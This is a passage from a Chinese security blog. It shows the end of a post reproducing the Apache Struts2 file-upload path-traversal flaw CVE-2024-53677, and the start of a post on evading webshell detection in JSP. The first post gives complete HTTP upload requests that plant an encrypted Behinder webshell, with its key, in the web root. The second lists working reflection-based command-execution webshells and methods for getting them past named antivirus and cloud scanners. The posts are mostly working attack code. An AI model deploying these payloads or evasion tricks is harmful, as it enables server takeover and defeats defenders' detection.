title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>利用poc上传一个测试jsp，利用路径穿越到web根目录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs powershell">POST /untitled_war/uploads.action HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">0.116</span>:<span class="hljs-number">8080</span><br>User<span class="hljs-literal">-Agent</span>: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; <span class="hljs-built_in">rv</span>:<span class="hljs-number">132.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">132.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,*/*;q=<span class="hljs-number">0.8</span><br>Accept<span class="hljs-literal">-Language</span>: zh<span class="hljs-literal">-CN</span>,zh;q=<span class="hljs-number">0.8</span>,zh<span class="hljs-literal">-TW</span>;q=<span class="hljs-number">0.7</span>,zh<span class="hljs-literal">-HK</span>;q=<span class="hljs-number">0.5</span>,en<span class="hljs-literal">-US</span>;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br>Accept<span class="hljs-literal">-Encoding</span>: gzip, deflate, br<br>Referer: http://<span class="hljs-number">172.16</span>.<span class="hljs-number">65.98</span>:<span class="hljs-number">8080</span>/untitled_war/<br>Content<span class="hljs-literal">-Type</span>: multipart/form<span class="hljs-literal">-data</span>; boundary=<span class="hljs-literal">---------------------------376058448320617365003265882680</span><br>Content<span class="hljs-literal">-Length</span>: <span class="hljs-number">529</span><br>Origin: http://<span class="hljs-number">192.168</span>.<span class="hljs-number">0.116</span>:<span class="hljs-number">8080</span><br>Connection: close<br>Cookie: JSESSIONID=<span class="hljs-number">953590</span>EEDDD585B3CFE1A15E18C518C9<br>Upgrade<span class="hljs-literal">-Insecure-Requests</span>: <span class="hljs-number">1</span><br>Priority: u=<span class="hljs-number">0</span>, i<br><br><span class="hljs-literal">-----------------------------376058448320617365003265882680</span><br>Content<span class="hljs-literal">-Disposition</span>: form<span class="hljs-literal">-data</span>; name=<span class="hljs-string">&quot;Upload&quot;</span>; filename=<span class="hljs-string">&quot;1.txt&quot;</span><br>Content<span class="hljs-literal">-Type</span>: application/octet<span class="hljs-literal">-stream</span><br><br>&lt;%<span class="hljs-selector-tag">@</span> page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br><br>&lt;body&gt;<br>    &lt;p&gt;test&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br><br><br><br><span class="hljs-literal">-----------------------------376058448320617365003265882680</span><br>Content<span class="hljs-literal">-Disposition</span>: form<span class="hljs-literal">-data</span>; name=<span class="hljs-string">&quot;uploadFileName[0]&quot;</span>;<br><br>../<span class="hljs-number">1</span>.jsp<br><span class="hljs-literal">-----------------------------376058448320617365003265882680--</span><br></code></pre></td></tr></table></figure><p><img src="1734625785344-83c8c8a1-3808-46b2-af0e-a6f5e453d5c0.png" alt="img"></p><p>可以被解析</p><p><img src="1734625866932-16eb70cf-40f5-46c0-9a2e-83dd09d5cb92.png" alt="img"></p><p>冰蝎马上传到web根目录。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs powershell">POST /untitled_war/uploads.action HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">0.116</span>:<span class="hljs-number">8080</span><br>User<span class="hljs-literal">-Agent</span>: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; <span class="hljs-built_in">rv</span>:<span class="hljs-number">132.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">132.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,*/*;q=<span class="hljs-number">0.8</span><br>Accept<span class="hljs-literal">-Language</span>: zh<span class="hljs-literal">-CN</span>,zh;q=<span class="hljs-number">0.8</span>,zh<span class="hljs-literal">-TW</span>;q=<span class="hljs-number">0.7</span>,zh<span class="hljs-literal">-HK</span>;q=<span class="hljs-number">0.5</span>,en<span class="hljs-literal">-US</span>;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br>Accept<span class="hljs-literal">-Encoding</span>: gzip, deflate, br<br>Referer: http://<span class="hljs-number">172.16</span>.<span class="hljs-number">65.98</span>:<span class="hljs-number">8080</span>/untitled_war/<br>Content<span class="hljs-literal">-Type</span>: multipart/form<span class="hljs-literal">-data</span>; boundary=<span class="hljs-literal">---------------------------376058448320617365003265882680</span><br>Content<span class="hljs-literal">-Length</span>: <span class="hljs-number">3632</span><br>Origin: http://<span class="hljs-number">192.168</span>.<span class="hljs-number">0.116</span>:<span class="hljs-number">8080</span><br>Connection: close<br>Cookie: JSESSIONID=<span class="hljs-number">953590</span>EEDDD585B3CFE1A15E18C518C9<br>Upgrade<span class="hljs-literal">-Insecure-Requests</span>: <span class="hljs-number">1</span><br>Priority: u=<span class="hljs-number">0</span>, i<br><br><span class="hljs-literal">-----------------------------376058448320617365003265882680</span><br>Content<span class="hljs-literal">-Disposition</span>: form<span class="hljs-literal">-data</span>; name=<span class="hljs-string">&quot;Upload&quot;</span>; filename=<span class="hljs-string">&quot;1.txt&quot;</span><br>Content<span class="hljs-literal">-Type</span>: application/octet<span class="hljs-literal">-stream</span><br><br>&lt;%@page import=<span class="hljs-string">&quot;java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*&quot;</span> %&gt;<br>&lt;%!<br>private byte<span class="hljs-function">[] <span class="hljs-title">Decrypt</span></span>(byte[] <span class="hljs-keyword">data</span>) throws Exception<br>&#123;<br>     byte[] decodebs;<br>        <span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">baseCls</span> ;                                                                                                    </span><br><span class="hljs-class">                <span class="hljs-title">try</span></span>&#123;                                                                                                                                                                                               <br>                    baseCls=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);                                                                                                                                                     <br>                    Object Decoder=baseCls.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, null).invoke(baseCls, null);                                                                                                                    <br>                    decodebs=(byte[]) Decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, new <span class="hljs-class"><span class="hljs-keyword">Class</span>[]</span>&#123;byte[].class&#125;).invoke(Decoder, new Object[]&#123;<span class="hljs-keyword">data</span>&#125;);                                                                       <br>                &#125;                                                                                                                                                                                                  <br>                <span class="hljs-keyword">catch</span> (Throwable e)                                                                                                                                                                                <br>                &#123;                                                                                                                                                                                                  <br>                    baseCls = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>                    Object Decoder=baseCls.newInstance();<br>                    decodebs=(byte[]) Decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>,new <span class="hljs-class"><span class="hljs-keyword">Class</span>[]</span>&#123;String.class&#125;).invoke(Decoder, new Object[]&#123;new String(<span class="hljs-keyword">data</span>)&#125;);<br><br>                &#125;<br>    String key=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; decodebs.length; i++) &#123;<br>                decodebs[<span class="hljs-type">i</span>] = (byte) ((decodebs[<span class="hljs-type">i</span>]) ^ (key.getBytes()[<span class="hljs-type">i</span> + <span class="hljs-number">1</span> &amp; <span class="hljs-number">15</span>]));<br>        &#125;<br>        <span class="hljs-keyword">return</span> decodebs;<br>&#125;<br>%&gt;<br>&lt;%!<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">U</span> <span class="hljs-title">extends</span> <span class="hljs-title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;super(c);&#125;public <span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">g</span>(<span class="hljs-title">byte</span> []<span class="hljs-title">b</span>)</span>&#123;<span class="hljs-keyword">return</span><br>        super.defineClass(b,<span class="hljs-number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.getMethod().equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;<br>            ByteArrayOutputStream bos = new ByteArrayOutputStream();<br>            byte[] buf = new byte[<span class="hljs-number">512</span>];<br>            int length=request.getInputStream().read(buf);<br>            <span class="hljs-keyword">while</span> (length&gt;<span class="hljs-number">0</span>)<br>            &#123;<br>                byte[] <span class="hljs-keyword">data</span>= Arrays.copyOfRange(buf,<span class="hljs-number">0</span>,length);<br>                bos.write(<span class="hljs-keyword">data</span>);<br>                length=request.getInputStream().read(buf);<br>            &#125;<br>            /* 取消如下代码的注释，可避免response.getOutputstream报错信息，增加某些深度定制的Java web系统的兼容性<br>            out.clear();<br>            out=pageContext.pushBody();<br>            */<br>            out.clear();<br>            out=pageContext.pushBody();<br>        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);&#125;<br>%&gt;<br><br><br><span class="hljs-literal">-----------------------------376058448320617365003265882680</span><br>Content<span class="hljs-literal">-Disposition</span>: form<span class="hljs-literal">-data</span>; name=<span class="hljs-string">&quot;uploadFileName[0]&quot;</span>;<br><br>../shell.jsp<br><span class="hljs-literal">-----------------------------376058448320617365003265882680--</span><br></code></pre></td></tr></table></figure><p><img src="1734626442075-98b5ae5c-2c27-42c7-bfe1-9755b06b3b37.png" alt="img"></p><p><img src="1734626514638-99d8f218-0c9a-4486-a71a-fdae77dc92e5.png" alt="img"></p><p><img src="1734626551793-b4619cdf-af30-4917-a523-8f394f88b800.png" alt="img"></p><h2 id="0x06-修复方式"><a href="#0x06-修复方式" class="headerlink" title="0x06 修复方式"></a>0x06 修复方式</h2><p>将框架升级到官方发布的最新版本，修复漏洞。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/">https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Apache</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jsp免杀探讨</title>
    <link href="/2025/03/22/jsp%E5%85%8D%E6%9D%80%E6%8E%A2%E8%AE%A8/"/>
    <url>/2025/03/22/jsp%E5%85%8D%E6%9D%80%E6%8E%A2%E8%AE%A8/</url>
    
    <content type="html"><![CDATA[<p>命令执行方法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>()<br><br><span class="hljs-function"><span class="hljs-title">ProcessBuilder</span><span class="hljs-params">()</span></span><br><br>ProcessImpl类的构造方法将会调用create方法执行native方法进行命令执行<br><br>UNIXProcess<br></code></pre></td></tr></table></figure><p>检测：</p><ul><li>变量名参数例如：String cmd &#x3D; “ “。</li><li>命令执行的方法：Runtime.getRuntime().exec()、ProcessBuilder、ProcessImpl（火绒、D盾）。</li><li>反射方法：invoke（阿里云webshell检测）。</li></ul><p>绕过：</p><ul><li>火绒：静态检测代码中没有敏感关键词即可，可以通过反转类名和方法名后反射得到命令执行；或者通过对类名和方法名加密解密后反射进行。</li><li>阿里云：常用少见的编码方式进行，利用CDATA特性。</li></ul><p>classload方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class class= Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Class</span> <span class="hljs-variable">class</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Class</span> <span class="hljs-variable">class</span> <span class="hljs-operator">=</span> java.lang.Runtime.class;<br>java.lang.<span class="hljs-type">Runtime</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> java.lang.Runtime.getRuntime();<span class="hljs-type">Class</span> <span class="hljs-variable">class</span> <span class="hljs-operator">=</span> obj.getClass();<br></code></pre></td></tr></table></figure><h2 id="基本反射马"><a href="#基本反射马" class="headerlink" title="基本反射马"></a>基本反射马</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span> %&gt;<br>&lt;%<br>   <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>   <span class="hljs-type">Class</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>   java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">gr</span> <span class="hljs-operator">=</span> rt.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>   java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> rt.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>   <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> (Process) ex.invoke(gr.invoke(<span class="hljs-literal">null</span>), cmd);<br>   java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> process.getInputStream();<br>   out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>   java.io.<span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">resultReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(in);<br>   java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">stdInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(resultReader);<br>   <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>   <span class="hljs-keyword">while</span> ((s = stdInput.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>       out.println(s);<br>  &#125;<br>   out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><p><strong>反射获取ProcessBuilder类实现命令执行</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.InvocationTargetException&quot;</span> %&gt;<br>&lt;%<br>    out.print(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase());<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>)&#123;<br>        String[] cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/c&quot;</span>,cmd&#125;;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            clazz = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructors</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            declaredConstructors = clazz.getDeclaredConstructor(String[].class);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            o = declaredConstructors.newInstance((Object) cmds);<br>        &#125; <span class="hljs-keyword">catch</span> (InstantiationException | IllegalAccessException | InvocationTargetException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            command = clazz.getDeclaredMethod(<span class="hljs-string">&quot;start&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            invoke = command.invoke(o);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException | InvocationTargetException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">invoke1</span> <span class="hljs-operator">=</span> (Process) invoke;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> invoke1.getInputStream();<br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(input, <span class="hljs-string">&quot;GBK&quot;</span>);<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(ins);<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        String line;<br>        <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            out.println(line);<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>        br.close();<br>        ins.close();<br>        input.close();<br>        invoke1.getOutputStream().close();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>反射获取ProcessImpl类实现命令执行</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.InvocationTargetException&quot;</span> %&gt;<br>&lt;%<br>    out.print(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase());<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>) &#123;<br>        String[] cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            clazz = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-comment">//获取该class类</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="hljs-type">boolean</span>.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//忽略访问权限</span><br>        <span class="hljs-type">Process</span> <span class="hljs-variable">invoke1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            invoke1 = (Process) method.invoke(<span class="hljs-literal">null</span>, cmds, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException | InvocationTargetException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> invoke1.getInputStream();<br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(input, <span class="hljs-string">&quot;GBK&quot;</span>);<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(ins);<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        String line;<br>        <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            out.println(line);<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>        br.close();<br>        ins.close();<br>        input.close();<br>        invoke1.getOutputStream().close();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="反转类名和方法名反射"><a href="#反转类名和方法名反射" class="headerlink" title="反转类名和方法名反射"></a>反转类名和方法名反射</h2><p>（可绕火绒，阿里云webshell因为检测到invoke显示为恶意）</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> pageEncoding=<span 